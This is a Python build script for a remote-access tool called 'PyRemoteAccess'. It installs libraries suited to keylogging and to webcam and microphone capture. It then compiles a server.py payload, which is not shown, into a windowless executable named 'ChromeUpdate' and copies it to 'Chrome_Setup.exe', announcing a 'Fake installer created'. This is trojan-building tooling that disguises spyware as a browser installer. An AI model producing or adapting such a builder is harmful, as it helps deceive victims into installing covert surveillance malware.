import os
import sys
import subprocess
import shutil

def check_pyinstaller():
    try:
        import PyInstaller
        return True
    except:
        return False

def install_pyinstaller():
    print("Installing pyinstaller...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        return True
    except:
        return False

def build_server_exe():
    print("Building server executable...")
    
    cmd = [
        'pyinstaller',
        '--onefile',
        '--noconsole', 
        '--name', 'ChromeUpdate',
        'server.py'
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print("Build successful: dist/ChromeUpdate.exe")
            
            if os.path.exists("dist/ChromeUpdate.exe"):
                shutil.copy2("dist/ChromeUpdate.exe", "Chrome_Setup.exe")
                print("Fake installer created: Chrome_Setup.exe")
            return True
        else:
            print("Build failed")
            print(result.stderr)
            return False
    except Exception as e:
        print(f"Build error: {e}")
        return False

def install_requirements():
    print("Installing packages...")
    
    packages = [
        'opencv-python',
        'pillow', 
        'pynput',
        'pywin32',
        'pycryptodome',
        'numpy',
        'PyQt5',
        'pyaudio',
        'requests'
    ]
    
    for package in packages:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print(f"Installed: {package}")
        except:
            print(f"Failed: {package}")

def clean_build():
    folders = ['build', 'dist']
    files = ['ChromeUpdate.spec']
    
    for folder in folders:
        if os.path.exists(folder):
            shutil.rmtree(folder)
    
    for file in files:
        if os.path.exists(file):
            os.remove(file)

def main():
    print("PyRemoteAccess Builder")
    print("1 - Build server only")
    print("2 - Install requirements") 
    print("3 - Full build")
    print("4 - Clean build files")
    
    choice = input("Select: ")
    
    if choice == "1":
        if not check_pyinstaller():
            if not install_pyinstaller():
                print("Failed to install pyinstaller")
                return
        build_server_exe()
        
    elif choice == "2":
        install_requirements()
        
    elif choice == "3":
        if not check_pyinstaller():
            install_pyinstaller()
        install_requirements()
        build_server_exe()
        
    elif choice == "4":
        clean_build()
        print("Cleaned")
        
    else:
        print("Wrong choice")

if __name__ == "__main__":
    main()